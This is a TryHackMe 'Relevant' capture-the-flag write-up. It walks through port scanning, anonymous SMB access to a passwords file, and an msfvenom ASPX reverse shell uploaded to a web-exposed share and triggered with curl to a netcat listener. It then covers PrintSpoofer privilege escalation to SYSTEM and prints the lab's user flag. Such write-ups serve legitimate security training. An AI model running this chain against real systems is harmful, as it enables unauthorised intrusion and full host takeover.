TryHackMe: Relevant Writeup

Target IP: 10.10.178.91 Difficulty: Medium Author: Mohd Faiz
SMB Enumeration IIS ASPX Payload SeImpersonatePrivilege PrintSpoofer
Phase 1: Full Port Scan & SMB Analysis [Nmap & Smbclient]

Run a comprehensive Nmap scan targeting all open TCP ports:

nmap -sC -sV -p- -oN relevant_nmap.txt 10.10.178.91

Open Ports Identified:

  • 80/tcp - Microsoft IIS httpd 10.0
  • 135/tcp - Microsoft Windows RPC
  • 139/445/tcp - Microsoft-DS SMB
  • 3389/tcp - RDP
  • 49663/tcp - Microsoft IIS httpd 10.0

SMB Enumeration:

Listing SMB shares without authentication:

smbclient -L //10.10.178.91/ -N

Output shows an unmapped user share: nt4wrksv. Connect anonymously:

smbclient //10.10.178.91/nt4wrksv -N
smb: \> ls
  passwords.txt                        A       159  Sat Jul 25 15:05:44 2020
smb: \> get passwords.txt

Decoding the Base64 strings found inside passwords.txt yields credential sets, but testing them across RDP / SMB leads to a dead end. However, we notice that files uploaded to nt4wrksv share are web-accessible via IIS on port 49663!

Phase 2: Initial Access (ASPX Reverse Shell) [Msfvenom & IIS Exploitation]

Generate a malicious ASPX reverse shell using msfvenom:

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.x.x LPORT=4444 -f aspx -o shell.aspx

Upload shell.aspx to the writable SMB share:

smbclient //10.10.178.91/nt4wrksv -N
smb: \> put shell.aspx

Start netcat listener on local machine:

nc -lvnp 4444

Trigger execution by requesting the uploaded file in browser:

curl http://10.10.178.91:49663/nt4wrksv/shell.aspx
User Flag (c:\Users\Bob\Desktop\user.txt): THM{1ff266924c66532170061f7077f88d23}
Phase 3: Privilege Escalation to SYSTEM [PrintSpoofer Privilege Exploitation]

Inspect granted security privileges for current account (iis apppool\defaultapppool):

whoami /priv

Privilege Privileges Summary:

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled

Since SeImpersonatePrivilege is enabled on Windows Server 2016/2019, we can execute PrintSpoofer.exe to gain a SYSTEM shell.

Execution Steps:

  1. Upload PrintSpoofer64.exe via our SMB session to nt4wrksv share.
  2. Navigate to c:\inetpub\wwwroot\nt4wrksv\ inside your web shell terminal.
  3. Execute PrintSpoofer targeting local system token: 
    PrintSpoofer64.exe -i -c cmd
  4. Verify shell context: whoami -> nt authority\system
